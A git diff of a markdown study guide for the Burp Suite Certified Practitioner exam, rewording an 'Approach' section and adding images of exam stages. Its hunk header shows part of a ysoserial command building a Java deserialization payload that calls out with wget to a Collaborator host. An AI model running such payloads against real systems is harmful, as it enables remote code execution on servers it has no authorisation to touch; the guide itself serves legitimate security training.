@@ -2148,11 +2148,14 @@ java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://Collabor
   
 ## Approach  
 
->If stuck in BSCP exam, then use [Micah van Deusen blog tip 5 table of category to stages](https://micahvandeusen.com/burp-suite-certified-practitioner-exam-review/) for ways to progress through the stages.  
->This is my personal view of the possible approach to leverage identified vulnerabilities and then using these notes to progress through the BSCP exam stages.  
+>When stuck in BSCP exam, refrence the below [Micah van Deusen blog tip 5 table of category to stages](https://micahvandeusen.com/burp-suite-certified-practitioner-exam-review/) for ways to progress through the stages.  
+
+![MicahVanDeusens-blog](images/MicahVanDeusens-blog.png)  
+  
+>The image below is my view of possible vulnerabilities to identify and exploit to reach the next BSCP exam stage and progress through the exam challenges.  
 
 ![Three stages](images/3stages.png)  
-
+  
 ## YouTube Training Playlist 
   
 [YouTube Study Playlist](https://youtube.com/playlist?list=PLsDxQTEdg_YkVMP6PybE7I-hAdhR7adem)  
